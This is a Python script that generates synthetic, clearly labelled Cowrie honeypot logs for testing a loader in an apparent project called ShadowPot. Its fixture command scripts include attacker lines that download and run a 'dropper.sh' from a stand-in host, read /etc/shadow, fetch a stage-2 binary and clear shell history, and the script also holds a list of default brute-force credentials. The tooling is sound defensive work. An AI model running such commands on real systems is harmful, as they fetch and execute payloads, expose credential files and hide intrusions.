#!/usr/bin/env python3
"""Generate synthetic Cowrie logs for developing and testing ShadowPot.

    python3 tools/gen_sample_logs.py --out data/sample-logs

EVERYTHING THIS WRITES IS FAKE. Every JSON line carries "synthetic": true, the
output directory gets a SYNTHETIC_DATA.txt marker, and a banner goes to stderr.
No number produced from this data may appear on a resume or in a README results
table. Only a real deployment's logs may do that.

Two safety rules are enforced in code, not just documented:

  * Addresses come only from the reserved documentation ranges -- RFC 5737
    (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) and RFC 3849
    (2001:db8::/32). A synthetic log must never contain an address that looks
    like a real attacker, because someone might block it, report it to an abuse
    desk, or try to "hack back" at an innocent third party.
  * URLs use the reserved .invalid TLD (RFC 2606), so no generated URL can
    resolve to anything.

The generator deliberately reproduces the awkward parts of the real format
documented in docs/LOG_FORMAT.md, because those are what the Phase 4 loader has
to survive: public-key logins with no `password` field, downloads with no `url`,
`late: true` events arriving after `cowrie.session.closed`, sessions split
across a rotation boundary at midnight, unknown event ids, and malformed lines.
A generator that emitted only tidy events would let a broken loader pass.

Output layout mirrors a real deployment with [honeypot] logtype = rotating:

    cowrie.json                 the current day
    cowrie.json.YYYY-MM-DD      each earlier day
    cowrie.json.YYYY-MM-DD.gz   optionally, the oldest (external logrotate)
    manifest.json               what was generated, for tests to assert against
    SYNTHETIC_DATA.txt          a human-readable warning

Cowrie itself never gzips; a .gz can only come from an external logrotate. The
--gzip-oldest flag exists so the loader's compressed path has a fixture.
"""

from __future__ import annotations

import argparse
import datetime as dt
import gzip
import hashlib
import json
import pathlib
import random
import sys

# --------------------------------------------------------------------------
# Reserved address space. See the module docstring for why this is not
# negotiable.
# --------------------------------------------------------------------------

IPV4_DOC_PREFIXES = ("192.0.2.", "198.51.100.", "203.0.113.")  # RFC 5737
IPV6_DOC_PREFIX = "2001:db8::"                                  # RFC 3849
INVALID_TLD = ".invalid"                                        # RFC 2606

# --------------------------------------------------------------------------
# Attack profile constants.
#
# These credential and banner strings are drawn from publicly documented
# brute-force behaviour. They are what bots actually try; none is a secret and
# none belongs to anyone.
# --------------------------------------------------------------------------

# Ordered most-tried first. The generator samples with a Zipf-like bias so the
# resulting distribution has a long tail, as real credential spraying does.
COMMON_CREDENTIALS: tuple[tuple[str, str], ...] = (
    ("root", "123456"),
    ("root", "root"),
    ("root", "admin"),
    ("root", "password"),
    ("admin", "admin"),
    ("root", "1234"),
    ("root", ""),              # the empty password is real, and common
    ("admin", "1234"),
    ("root", "toor"),
    ("ubuntu", "ubuntu"),
    ("pi", "raspberry"),
    ("admin", "password"),
    ("root", "12345678"),
    ("test", "test"),
    ("oracle", "oracle"),
    ("user", "user"),
    ("root", "qwerty"),
    ("guest", "guest"),
    ("postgres", "postgres"),
    ("root", "P@ssw0rd"),
)

# A credential that the honeypot "accepts". Cowrie is configured with a
# userdb; one pair succeeding is what makes a shell session possible at all.
ACCEPTED_CREDENTIAL = ("root", "123456")

CLIENT_BANNERS: tuple[str, ...] = (
    "SSH-2.0-libssh2_1.9.0",
    "SSH-2.0-libssh_0.9.6",
    "SSH-2.0-paramiko_2.11.0",
    "SSH-2.0-Go",
    "SSH-2.0-OpenSSH_7.4",
    "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1",
    "SSH-2.0-PUTTY",
)

# (kex, enc_c2s, mac_c2s, comp_c2s) -- the four lists HASSH is computed from,
# in that order. keyAlgs and langCS are deliberately NOT here: they are not
# inputs to the digest, which is the whole point of the FD in
# docs/NORMALIZATION.md section 5.1.
KEX_PROFILES: tuple[tuple[str, str, str, str], ...] = (
    (
        "curve25519-sha256,ecdh-sha2-nistp256,diffie-hellman-group14-sha1",
        "aes128-ctr,aes192-ctr,aes256-ctr",
        "hmac-sha2-256,hmac-sha1",
        "none",
    ),
    (
        "diffie-hellman-group1-sha1,diffie-hellman-group14-sha1",
        "aes128-cbc,3des-cbc",
        "hmac-sha1,hmac-md5",
        "none,zlib",
    ),
    (
        "curve25519-sha256@libssh.org,ecdh-sha2-nistp521",
        "chacha20-poly1305@openssh.com,aes256-gcm@openssh.com",
        "hmac-sha2-512-etm@openssh.com",
        "none",
    ),
)

HOST_KEY_ALGS = (
    "ssh-rsa,ssh-dss",
    "rsa-sha2-512,rsa-sha2-256,ssh-ed25519",
)

# A scripted bot runs the identical sequence every time, fast. That identity is
# what the Phase 5 "bot vs human-like" heuristic looks for.
BOT_COMMAND_SCRIPTS: tuple[tuple[str, ...], ...] = (
    (
        "uname -a",
        "cat /proc/cpuinfo | grep name | head -n 1",
        "free -m | grep Mem",
        "ls -lh $(which ls)",
        "crontab -l",
        "w",
    ),
    (
        "enable",
        "system",
        "shell",
        "sh",
        "cat /proc/mounts; /bin/busybox XVUFP",
    ),
    (
        "/ip cloud print",
        "ifconfig",
        "uname -a",
    ),
)

# A human-looking operator types more slowly, makes a typo, and explores.
INTERACTIVE_SCRIPTS: tuple[tuple[str, ...], ...] = (
    (
        "uname -a",
        "whoami",
        "cat /proc/cpuinfo",
        "ls -la /tmp",
        "cd /tmp",
        "wget http://malware-host-1.example" + INVALID_TLD + "/x86/dropper.sh",
        "chmod +x dropper.sh",
        "./dropper.sh",
        "history -c",
    ),
    (
        "uname -a",
        "cat /etc/passwd",
        "cat /etc/shadw",          # typo: a human artefact
        "cat /etc/shadow",
        "ps aux",
        "netstat -antp",
        "curl -O http://stage-2.example" + INVALID_TLD + "/bins/arm7",
        "exit",
    ),
)

# Commands the emulated shell does not implement -> cowrie.command.failed.
UNIMPLEMENTED_COMMANDS = ("enable", "system", "shell", "/ip cloud print")

# Real Cowrie events that ShadowPot deliberately does not model. Including them
# exercises the loader's "skip unknown safely" path with genuine event ids
# rather than invented ones. See docs/LOG_FORMAT.md section 6.
UNMODELLED_EVENTS = ("cowrie.client.size", "cowrie.session.params",
                     "cowrie.log.closed")

SENSOR_NAME = "shadowpot-synthetic-1"


def md5_hex(text: str) -> str:
    """HASSH is an MD5 digest. Computing it for real means the functional
    dependency hassh -> hassh_algorithms actually holds in the fixtures, so the
    Phase 2 schema's kex_fingerprints table is exercised honestly rather than
    with arbitrary 32-character strings.

    MD5 is used here because the HASSH specification uses it, not as a
    security choice. Nothing is authenticated with this value.
    """
    return hashlib.md5(text.encode("utf-8")).hexdigest()


def sha256_hex(label: str) -> str:
    """A stable fake file checksum. Derived from a label so the same artifact
    gets the same hash across runs and across days, which is what makes
    "one sample fetched by many IPs" queryable."""
    return hashlib.sha256(f"shadowpot-synthetic:{label}".encode()).hexdigest()


class Generator:
    def __init__(self, args: argparse.Namespace) -> None:
        self.args = args
        self.rng = random.Random(args.seed)
        self.start_date = dt.date.fromisoformat(args.start_date)

        # Tallies, written to manifest.json. These are incremented at write
        # time, so they are an independent count of what actually reached the
        # file rather than a prediction. The Phase 5 query tests assert that
        # SQL aggregation over the loaded database reproduces them -- two
        # different code paths computing the same quantity.
        self.tally: dict[str, int] = {
            "sessions": 0,
            "events_written": 0,
            "login_attempts": 0,
            "login_successes": 0,
            "publickey_attempts": 0,
            "commands": 0,
            "commands_failed": 0,
            "downloads": 0,
            "downloads_without_url": 0,
            "uploads": 0,
            "late_events": 0,
            "unmodelled_events": 0,
            "unknown_event_lines": 0,
            "malformed_lines": 0,
            "sessions_spanning_midnight": 0,
        }
        self.credential_counts: dict[str, int] = {}
        self.ip_counts: dict[str, int] = {}
        self.command_counts: dict[str, int] = {}
        self.first_command_counts: dict[str, int] = {}
        self.artifact_fetchers: dict[str, set[str]] = {}

        # session id -> allocated ids, to guarantee uniqueness without relying
        # on luck from a 12-hex-character space.
        self._used_session_ids: set[str] = set()

        # The attacker population. A few heavy hitters and a long tail of
        # one-session addresses, which is the shape real honeypot data has.
        self.heavy_ips = [self._doc_ipv4() for _ in range(6)]
        self.ipv6_ips = [self._doc_ipv6() for _ in range(3)]

    # -- address and identifier helpers ---------------------------------

    def _doc_ipv4(self) -> str:
        return (self.rng.choice(IPV4_DOC_PREFIXES)
                + str(self.rng.randint(1, 254)))

    def _doc_ipv6(self) -> str:
        return IPV6_DOC_PREFIX + format(self.rng.randint(0x1000, 0xffff), "x")

    def _session_id(self) -> str:
        """12 lowercase hex characters, matching uuid.uuid4().hex[:12]."""
        while True:
            sid = "".join(self.rng.choice("0123456789abcdef") for _ in range(12))
            if sid not in self._used_session_ids:
                self._used_session_ids.add(sid)
                return sid

    def _pick_credential(self) -> tuple[str, str]:
        """Zipf-like: index 0 is tried far more often than index 19."""
        n = len(COMMON_CREDENTIALS)
        weights = [1.0 / (i + 1) for i in range(n)]
        return self.rng.choices(COMMON_CREDENTIALS, weights=weights, k=1)[0]

    def _pick_source(self) -> str:
        roll = self.rng.random()
        if roll < 0.55:
            return self.rng.choice(self.heavy_ips)
        if roll < 0.62:
            return self.rng.choice(self.ipv6_ips)
        return self._doc_ipv4()

    def _timestamp(self, moment: dt.datetime) -> str:
        """Render a timestamp in the form Cowrie would emit.

        Cowrie picks its format from the environment: TZ=UTC gives
        '...Z', anything else gives '...+0000' with no colon. Both are
        generated so the loader's canonicalization has fixtures for each.
        """
        base = moment.strftime("%Y-%m-%dT%H:%M:%S.") + f"{moment.microsecond:06d}"
        return base + ("Z" if self.args.timestamp_form == "z" else "+0000")

    # -- event construction ---------------------------------------------

    def _event(self, eventid: str, moment: dt.datetime, session: str,
               src_ip: str, message: str = "", **extra: object) -> dict:
        """Build one event with the attributes Cowrie adds to every line.

        Field order mirrors nothing in particular; Cowrie's own order is an
        artefact of its logging framework. What matters is that the names and
        types match docs/LOG_FORMAT.md exactly.
        """
        event: dict[str, object] = {
            "eventid": eventid,
            "timestamp": self._timestamp(moment),
            "session": session,
            "src_ip": src_ip,
            "message": message,
            "sensor": SENSOR_NAME,
            # Not a Cowrie field. Added by this generator so that no synthetic
            # line can ever be mistaken for a captured one, and so the loader
            # can flag the whole session as synthetic.
            "synthetic": True,
        }
        event.update(extra)
        return event

    def _connection_attrs(self, src_port: int) -> dict:
        return {
            "protocol": "ssh",
            "src_port": src_port,
            "dst_ip": "203.0.113.200",     # the honeypot itself, also reserved
            "dst_port": 2222,
        }

    def _build_session(self, start: dt.datetime, kind: str) -> list[dict]:
        """Produce one session's events, in emission order.

        `kind` is one of:
            'bruteforce'  -- credential spraying, no successful login
            'bot'         -- logs in, runs a fixed script very fast
            'interactive' -- logs in, types slowly, downloads a payload
            'publickey'   -- offers an SSH key, so the events carry NO password
        """
        sid = self._session_id()
        src_ip = self._pick_source()
        src_port = self.rng.randint(1024, 65535)
        conn = self._connection_attrs(src_port)
        events: list[dict] = []
        now = start

        self.ip_counts[src_ip] = self.ip_counts.get(src_ip, 0) + 1

        events.append(self._event(
            "cowrie.session.connect", now, sid, src_ip,
            f"New connection: {src_ip}:{src_port} ({conn['dst_ip']}:2222) "
            f"[session: {sid}]",
            **conn,
        ))

        now += dt.timedelta(milliseconds=self.rng.randint(20, 400))
        banner = self.rng.choice(CLIENT_BANNERS)
        events.append(self._event(
            "cowrie.client.version", now, sid, src_ip,
            f"Remote SSH version: {banner}",
            version=banner, **conn,
        ))

        now += dt.timedelta(milliseconds=self.rng.randint(5, 60))
        kex, enc, mac, comp = self.rng.choice(KEX_PROFILES)
        hassh_algorithms = ";".join((kex, enc, mac, comp))
        events.append(self._event(
            "cowrie.client.kex", now, sid, src_ip,
            "SSH client hassh fingerprint",
            hassh=md5_hex(hassh_algorithms),
            hasshAlgorithms=hassh_algorithms,
            # Lists, not strings -- Cowrie sends them as JSON arrays.
            kexAlgs=kex.split(","),
            keyAlgs=self.rng.choice(HOST_KEY_ALGS).split(","),
            encCS=enc.split(","),
            macCS=mac.split(","),
            compCS=comp.split(","),
            langCS=[""],
            **conn,
        ))

        # ---- authentication ----
        if kind == "publickey":
            # No `password` field at all. This is the case that breaks a
            # nullable-password credentials table.
            fingerprint = ":".join(
                format(self.rng.randint(0, 255), "02x") for _ in range(16)
            )
            key_type = self.rng.choice(("ssh-rsa", "ssh-ed25519"))
            username = self.rng.choice(("root", "admin", "oracle"))
            for _ in range(self.rng.randint(1, 3)):
                now += dt.timedelta(milliseconds=self.rng.randint(40, 300))
                events.append(self._event(
                    "cowrie.login.failed", now, sid, src_ip,
                    f"public key attempt for user {username}",
                    username=username, fingerprint=fingerprint,
                    type=key_type,
                    key="AAAAB3NzaC1yc2EAAAADAQABAAABgQ" + sha256_hex(fingerprint)[:40],
                    **conn,
                ))
                self.tally["login_attempts"] += 1
                self.tally["publickey_attempts"] += 1
            logged_in = False
        else:
            attempts = (self.rng.randint(3, 18) if kind == "bruteforce"
                        else self.rng.randint(1, 4))
            logged_in = False
            for i in range(attempts):
                now += dt.timedelta(milliseconds=self.rng.randint(30, 900))
                last = i == attempts - 1
                succeed = last and kind in ("bot", "interactive")
                username, password = (ACCEPTED_CREDENTIAL if succeed
                                      else self._pick_credential())
                eventid = ("cowrie.login.success" if succeed
                           else "cowrie.login.failed")
                events.append(self._event(
                    eventid, now, sid, src_ip,
                    f"login attempt [{username}/{password}] "
                    f"{'succeeded' if succeed else 'failed'}",
                    username=username, password=password, **conn,
                ))
                key = f"{username}\x00{password}"
                self.credential_counts[key] = self.credential_counts.get(key, 0) + 1
                self.tally["login_attempts"] += 1
                if succeed:
                    self.tally["login_successes"] += 1
                    logged_in = True

        # ---- shell activity ----
        if logged_in:
            if kind == "bot":
                script = self.rng.choice(BOT_COMMAND_SCRIPTS)
                # Faster than a human can type: this is the signal the Phase 5
                # heuristic keys on. Stated as a heuristic, not a fact.
                gap = lambda: dt.timedelta(milliseconds=self.rng.randint(8, 90))
            else:
                script = self.rng.choice(INTERACTIVE_SCRIPTS)
                gap = lambda: dt.timedelta(milliseconds=self.rng.randint(1500, 14000))

            for position, command in enumerate(script):
                now += gap()
                failed = command in UNIMPLEMENTED_COMMANDS
                events.append(self._event(
                    "cowrie.command.failed" if failed else "cowrie.command.input",
                    now, sid, src_ip,
                    f"CMD: {command}",
                    input=command, **conn,
                ))
                self.tally["commands"] += 1
                if failed:
                    self.tally["commands_failed"] += 1
                self.command_counts[command] = self.command_counts.get(command, 0) + 1
                if position == 0:
                    self.first_command_counts[command] = (
                        self.first_command_counts.get(command, 0) + 1)

                # A wget/curl command produces a download event.
                if command.startswith(("wget ", "curl ")):
                    url = command.split()[-1]
                    label = url.rsplit("/", 1)[-1]
                    shasum = sha256_hex(label)
                    now += dt.timedelta(milliseconds=self.rng.randint(200, 2000))
                    events.append(self._event(
                        "cowrie.session.file_download", now, sid, src_ip,
                        f"Downloaded URL ({url}) with SHA-256 {shasum}",
                        url=url,
                        outfile=f"var/lib/cowrie/downloads/{shasum}",
                        shasum=shasum,
                        destfile=label,
                        duplicate=self.rng.random() < 0.4,
                        **conn,
                    ))
                    self.tally["downloads"] += 1
                    self.artifact_fetchers.setdefault(shasum, set()).add(src_ip)

            # A redirect/stdin capture: a file_download with NO url. The brief
            # assumed url was always present; LOG_FORMAT.md section 4 shows it
            # is absent for exactly this case.
            if kind == "interactive" and self.rng.random() < 0.5:
                shasum = sha256_hex(f"redirect-capture-{sid}")
                now += dt.timedelta(milliseconds=self.rng.randint(100, 900))
                events.append(self._event(
                    "cowrie.session.file_download", now, sid, src_ip,
                    f"Saved stdin redirect with SHA-256 {shasum}",
                    outfile=f"var/lib/cowrie/downloads/{shasum}",
                    shasum=shasum,
                    destfile="/tmp/.x",
                    **conn,
                ))
                self.tally["downloads"] += 1
                self.tally["downloads_without_url"] += 1
                self.artifact_fetchers.setdefault(shasum, set()).add(src_ip)

            # An occasional SFTP/SCP upload: `filename`, and never a url.
            if self.rng.random() < 0.12:
                shasum = sha256_hex(f"upload-{sid}")
                now += dt.timedelta(milliseconds=self.rng.randint(100, 800))
                events.append(self._event(
                    "cowrie.session.file_upload", now, sid, src_ip,
                    f"Uploaded file with SHA-256 {shasum}",
                    filename="payload.bin",
                    outfile=f"var/lib/cowrie/downloads/{shasum}",
                    shasum=shasum,
                    destfile="/tmp/payload.bin",
                    **conn,
                ))
                self.tally["uploads"] += 1

        # An unmodelled-but-real event, to exercise the skip path.
        if self.rng.random() < 0.18:
            now += dt.timedelta(milliseconds=self.rng.randint(5, 50))
            which = self.rng.choice(UNMODELLED_EVENTS)
            payload: dict[str, object] = {}
            if which == "cowrie.client.size":
                payload = {"width": 80, "height": 24}
            elif which == "cowrie.session.params":
                payload = {"arch": "linux-x64-lsb"}
            else:
                payload = {"ttylog": f"var/lib/cowrie/tty/{sha256_hex(sid)}",
                           "size": self.rng.randint(200, 9000),
                           "duration_ms": self.rng.randint(100, 60000),
                           "shasum": sha256_hex("tty-" + sid),
                           "duplicate": False}
            events.append(self._event(which, now, sid, src_ip, "", **payload))
            self.tally["unmodelled_events"] += 1

        # ---- close ----
        now += dt.timedelta(milliseconds=self.rng.randint(50, 1500))
        duration_ms = int((now - start).total_seconds() * 1000)
        events.append(self._event(
            "cowrie.session.closed", now, sid, src_ip,
            "Connection lost after "
            f"{duration_ms // 1000} seconds",
            # Integer milliseconds. The old `duration` field was removed
            # upstream in Cowrie 3.0.4; this generator never emits it.
            duration_ms=duration_ms,
            **conn,
        ))

        # ---- a late event, AFTER the session closed ----
        # Cowrie dispatches an event with late: true when it completes after
        # the connection is gone -- a download that finished during teardown,
        # for instance. A loader that treats session.closed as a terminator
        # loses exactly these rows, which are the most interesting ones.
        if logged_in and self.rng.random() < 0.15:
            now += dt.timedelta(milliseconds=self.rng.randint(100, 3000))
            shasum = sha256_hex(f"late-{sid}")
            events.append(self._event(
                "cowrie.session.file_download", now, sid, src_ip,
                f"Downloaded URL with SHA-256 {shasum}",
                url=f"http://late-stage.example{INVALID_TLD}/{shasum[:12]}.bin",
                outfile=f"var/lib/cowrie/downloads/{shasum}",
                shasum=shasum,
                late=True,
                **conn,
            ))
            self.tally["downloads"] += 1
            self.tally["late_events"] += 1
            self.artifact_fetchers.setdefault(shasum, set()).add(src_ip)

        self.tally["sessions"] += 1
        if events[0]["timestamp"][:10] != events[-1]["timestamp"][:10]:
            self.tally["sessions_spanning_midnight"] += 1
        return events

    # -- top level -------------------------------------------------------

    def _session_kind(self) -> str:
        roll = self.rng.random()
        if roll < 0.74:
            return "bruteforce"
        if roll < 0.88:
            return "bot"
        if roll < 0.96:
            return "interactive"
        return "publickey"

    def generate(self) -> tuple[dict[str, list[dict]], dict]:
        """Return (events bucketed by UTC date string, manifest)."""
        by_day: dict[str, list[dict]] = {}
        all_events: list[dict] = []

        for day_index in range(self.args.days):
            day = self.start_date + dt.timedelta(days=day_index)
            count = max(1, int(self.rng.gauss(self.args.sessions_per_day,
                                              self.args.sessions_per_day * 0.2)))
            for _ in range(count):
                # Attack traffic is not uniform across the day, but it is much
                # flatter than human traffic: bots do not sleep. A mild
                # preference for the small hours, nothing more.
                hour = self.rng.choices(
                    range(24),
                    weights=[1.4 if h < 6 else 1.0 for h in range(24)],
                    k=1,
                )[0]
                start = dt.datetime(
                    day.year, day.month, day.day, hour,
                    self.rng.randint(0, 59), self.rng.randint(0, 59),
                    self.rng.randint(0, 999999),
                    tzinfo=dt.timezone.utc,
                )
                all_events.extend(self._build_session(start, self._session_kind()))

            # Deliberately push one session right up against midnight so that
            # a session reliably spans the rotation boundary, rather than
            # hoping the random clock lands there.
            if day_index < self.args.days - 1:
                start = dt.datetime(
                    day.year, day.month, day.day, 23, 59,
                    self.rng.randint(30, 50), self.rng.randint(0, 999999),
                    tzinfo=dt.timezone.utc,
                )
                all_events.extend(self._build_session(start, "interactive"))

        # Bucket by the UTC date in each event's own timestamp. A session that
        # crosses midnight therefore lands in two files, exactly as a real
        # rotating deployment would record it.
        for event in all_events:
            by_day.setdefault(str(event["timestamp"])[:10], []).append(event)
        for day_events in by_day.values():
            day_events.sort(key=lambda e: str(e["timestamp"]))

        manifest = {
            "synthetic": True,
            "warning": "SYNTHETIC SAMPLE DATA. No number derived from this "
                       "file may be published as a real measurement.",
            "generator": "tools/gen_sample_logs.py",
            "seed": self.args.seed,
            "start_date": self.args.start_date,
            "days": self.args.days,
            "timestamp_form": self.args.timestamp_form,
            "sensor": SENSOR_NAME,
            "accepted_credential": list(ACCEPTED_CREDENTIAL),
            "tally": self.tally,
            "top_credentials": [
                {"username": k.split("\x00")[0],
                 "password": k.split("\x00")[1],
                 "attempts": v}
                for k, v in sorted(self.credential_counts.items(),
                                   key=lambda kv: (-kv[1], kv[0]))[:10]
            ],
            "top_source_ips": [
                {"ip": k, "sessions": v}
                for k, v in sorted(self.ip_counts.items(),
                                   key=lambda kv: (-kv[1], kv[0]))[:10]
            ],
            "top_commands": [
                {"input": k, "count": v}
                for k, v in sorted(self.command_counts.items(),
                                   key=lambda kv: (-kv[1], kv[0]))[:10]
            ],
            "top_first_commands": [
                {"input": k, "count": v}
                for k, v in sorted(self.first_command_counts.items(),
                                   key=lambda kv: (-kv[1], kv[0]))[:10]
            ],
            "artifacts_by_fetcher_count": [
                {"sha256": k, "distinct_ips": len(v)}
                for k, v in sorted(self.artifact_fetchers.items(),
                                   key=lambda kv: (-len(kv[1]), kv[0]))[:10]
            ],
            "files": {},
        }
        return by_day, manifest


# Edge-case fixtures, split by the ingest_runs column a loader must count them
# in. Conflating the two is an easy mistake: an invented event id is a
# perfectly well-formed JSON event that we simply do not model, which is a
# completely different condition from a line that is not parseable at all.

# -> ingest_runs.lines_malformed: not parseable, or parseable but not an event.
MALFORMED_LINES = (
    # Truncated mid-object: not valid JSON.
    '{"eventid": "cowrie.session.connect", "timestamp": "2026-11-0',
    # Valid JSON, but an array rather than an object.
    "[1, 2, 3]",
    # An object with no eventid at all.
    '{"timestamp": "2026-11-03T00:00:00.000000Z", "session": "a1b2c3d4e5f6"}',
    # An eventid of the wrong type. A parser doing eventid.startswith(...)
    # raises AttributeError here rather than skipping the line.
    '{"eventid": 42, "timestamp": "2026-11-03T00:00:00.000000Z"}',
    # Blank and whitespace-only lines.
    "",
    "   ",
)


def unknown_event_line(day: str, orphan_session: str,
                       timestamp_form: str) -> str:
    """-> ingest_runs.events_unknown: a valid event with an id we do not model.

    It also references a session that has no cowrie.session.connect anywhere
    in the data, which exercises the orphan-session path from
    docs/LOG_FORMAT.md section 7: an event may legitimately arrive for a
    session whose connect was rotated away before ingestion.

    The session id differs per file so that this fixture cannot be mistaken
    for a genuine session split across a rotation boundary.

    It must honour timestamp_form: one Cowrie process picks its format once
    from the environment, so a single file never mixes ...Z and ...+0000. A
    fixture that ignored the setting would make the generated data less
    realistic than the real thing in exactly the dimension being tested.
    """
    suffix = "Z" if timestamp_form == "z" else "+0000"
    return json.dumps(
        {
            "eventid": "cowrie.not.a.real.event",
            "timestamp": f"{day}T00:00:00.000000{suffix}",
            "session": orphan_session,
            "src_ip": "192.0.2.1",
            "message": "an event id ShadowPot does not model",
            "sensor": SENSOR_NAME,
            "synthetic": True,
        },
        separators=(",", ":"),
    )


def orphan_session_id(day: str) -> str:
    """A deterministic 12-hex id that belongs to no generated session."""
    return "dead" + hashlib.sha256(day.encode()).hexdigest()[:8]


def write_output(by_day: dict[str, list[dict]], manifest: dict,
                 args: argparse.Namespace, gen: Generator) -> pathlib.Path:
    out = pathlib.Path(args.out)
    out.mkdir(parents=True, exist_ok=True)

    # Refuse to write over anything that does not look synthetic. Real captured
    # logs are irreplaceable, and a mistyped --out should not be able to
    # destroy a deployment's only copy.
    existing = sorted(out.glob("cowrie.json*"))
    if existing and not args.force:
        for path in existing:
            opener = gzip.open if path.suffix == ".gz" else open
            try:
                with opener(path, "rt", encoding="utf-8") as handle:
                    head = handle.readline()
            except OSError:
                head = ""
            if head and '"synthetic"' not in head:
                sys.exit(
                    f"refusing to overwrite {path}: its first line carries no "
                    '"synthetic" marker, so it may be real captured data. '
                    "Pass --force only if you are certain."
                )

    days = sorted(by_day)
    written: dict[str, int] = {}

    for index, day in enumerate(days):
        is_current = index == len(days) - 1
        name = "cowrie.json" if is_current else f"cowrie.json.{day}"
        lines = [json.dumps(event, separators=(",", ":"))
                 for event in by_day[day]]
        gen.tally["events_written"] += len(lines)

        event_lines = len(lines)
        bad_lines = 0

        if args.edge_cases:
            # Sprinkle the bad lines through the MIDDLE of each file. A parser
            # that only guards its first and last line passes a file whose
            # damage is at the edges and fails on a real one.
            injected = list(MALFORMED_LINES) + [
                unknown_event_line(day, orphan_session_id(day),
                                   args.timestamp_form)
            ]
            for offset, bad in enumerate(injected):
                if not lines:
                    continue
                at = min(len(lines) - 1, (offset + 1) * max(1, len(lines) // 8))
                lines.insert(at, bad)
                bad_lines += 1
                if bad.startswith('{"eventid":"cowrie.not.a.real.event"'):
                    gen.tally["unknown_event_lines"] += 1
                else:
                    gen.tally["malformed_lines"] += 1

        text = "\n".join(lines) + "\n"

        if args.edge_cases and is_current:
            # A truncated final line with no trailing newline, as happens when
            # the honeypot process is killed mid-write. Cowrie writes a whole
            # line per call so this is rare, but it must not abort a load --
            # and a resumable loader must not record an offset past it, or it
            # would skip the rest of that line when it is eventually completed.
            text += '{"eventid":"cowrie.session.conn'
            bad_lines += 1
            gen.tally["malformed_lines"] += 1

        path = out / name
        path.write_text(text, encoding="utf-8")
        written[name] = {"lines": len(lines) + (1 if bad_lines and is_current
                                               and args.edge_cases else 0),
                         "event_lines": event_lines,
                         "bad_lines": bad_lines}

    # Optionally gzip the oldest files, simulating an external logrotate.
    # Cowrie itself never compresses.
    for day in days[: args.gzip_oldest]:
        plain = out / f"cowrie.json.{day}"
        if plain.exists():
            # mtime=0 and filename="" keep the gzip HEADER deterministic.
            # gzip.open() cannot do this: it has no mtime parameter, and by
            # default GzipFile stamps the current time and the source filename
            # into the header, which would make byte-identical output
            # impossible to test for.
            with open(plain, "rb") as src, open(f"{plain}.gz", "wb") as raw:
                with gzip.GzipFile(filename="", mode="wb", fileobj=raw,
                                   mtime=0) as dst:
                    dst.write(src.read())
            plain.unlink()
            written[f"cowrie.json.{day}.gz"] = written.pop(f"cowrie.json.{day}")
            written[f"cowrie.json.{day}.gz"]["compressed"] = True

    manifest["files"] = written
    manifest["tally"] = gen.tally
    manifest["orphan_session_ids"] = (
        sorted({orphan_session_id(day) for day in days}) if args.edge_cases else []
    )
    # What a correct loader should report, so Phase 4 can assert against it
    # instead of against numbers typed into a test by hand.
    #
    # lines_applied is NOT events_written. An event with a real but unmodelled
    # id -- cowrie.client.size, cowrie.session.params, cowrie.log.closed -- is
    # written as a perfectly good event and is then counted by the loader as
    # events_unknown, never as applied. Conflating the two is an easy mistake
    # and was in fact made here first: the loader reported 109 fewer applied
    # lines than this block predicted, 109 being exactly the unmodelled count.
    manifest["expected_ingest_run"] = {
        "lines_read": sum(f["lines"] for f in written.values()),
        "lines_applied": (gen.tally["events_written"]
                          - gen.tally["unmodelled_events"]),
        "lines_malformed": gen.tally["malformed_lines"],
        "events_unknown": (gen.tally["unmodelled_events"]
                           + gen.tally["unknown_event_lines"]),
    }
    (out / "manifest.json").write_text(
        json.dumps(manifest, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )

    (out / "SYNTHETIC_DATA.txt").write_text(
        "SYNTHETIC SAMPLE DATA\n"
        "=====================\n\n"
        "Every file in this directory was produced by\n"
        "tools/gen_sample_logs.py and is entirely fabricated.\n\n"
        "  * No real attacker touched this honeypot.\n"
        "  * Every address is from a reserved documentation range\n"
        "    (RFC 5737 for IPv4, RFC 3849 for IPv6). None of them\n"
        "    belongs to anyone. Do not block, report or investigate them.\n"
        "  * Every URL uses the reserved .invalid TLD (RFC 2606) and\n"
        "    cannot resolve.\n"
        "  * Every JSON line carries \"synthetic\": true.\n\n"
        "NO NUMBER DERIVED FROM THIS DATA MAY APPEAR ON A RESUME, IN A\n"
        "README RESULTS TABLE, OR IN ANY REPORT PRESENTED AS A FINDING.\n"
        "Only a real deployment's own logs may be used for that.\n\n"
        f"seed={manifest['seed']} start_date={manifest['start_date']} "
        f"days={manifest['days']}\n",
        encoding="utf-8",
    )
    return out


def parse_args(argv: list[str] | None = None) -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Generate synthetic Cowrie logs for ShadowPot.",
        epilog="Everything written is fake. See SYNTHETIC_DATA.txt in the "
               "output directory.",
    )
    p.add_argument("--out", default="data/sample-logs",
                   help="output directory (default: %(default)s)")
    p.add_argument("--seed", type=int, default=1337,
                   help="RNG seed; identical seeds give byte-identical output "
                        "(default: %(default)s)")
    p.add_argument("--start-date", default="2026-11-01",
                   help="first UTC day to generate. FIXED by default, not "
                        "'today', so output is reproducible forever "
                        "(default: %(default)s)")
    p.add_argument("--days", type=int, default=7,
                   help="number of days (default: %(default)s)")
    p.add_argument("--sessions-per-day", type=int, default=90,
                   help="mean sessions per day (default: %(default)s)")
    p.add_argument("--timestamp-form", choices=("z", "offset"), default="z",
                   help="'z' emits ...Z as Cowrie does under TZ=UTC; 'offset' "
                        "emits ...+0000 as it does otherwise "
                        "(default: %(default)s)")
    p.add_argument("--gzip-oldest", type=int, default=1, metavar="N",
                   help="gzip the N oldest rotated files, simulating an "
                        "external logrotate (default: %(default)s)")
    p.add_argument("--no-edge-cases", dest="edge_cases", action="store_false",
                   help="omit malformed lines and the truncated final line")
    p.add_argument("--force", action="store_true",
                   help="overwrite existing logs even if they lack a "
                        "\"synthetic\" marker")
    p.add_argument("--quiet", action="store_true", help="suppress the banner")
    return p.parse_args(argv)


def main(argv: list[str] | None = None) -> int:
    args = parse_args(argv)
    gen = Generator(args)
    by_day, manifest = gen.generate()
    out = write_output(by_day, manifest, args, gen)

    if not args.quiet:
        t = gen.tally
        print(
            "\n"
            "  ============================================================\n"
            "   SYNTHETIC SAMPLE DATA -- NOT A REAL HONEYPOT CAPTURE\n"
            "  ============================================================\n"
            f"   output      {out}\n"
            f"   seed        {args.seed}   days {args.days}   "
            f"start {args.start_date}\n"
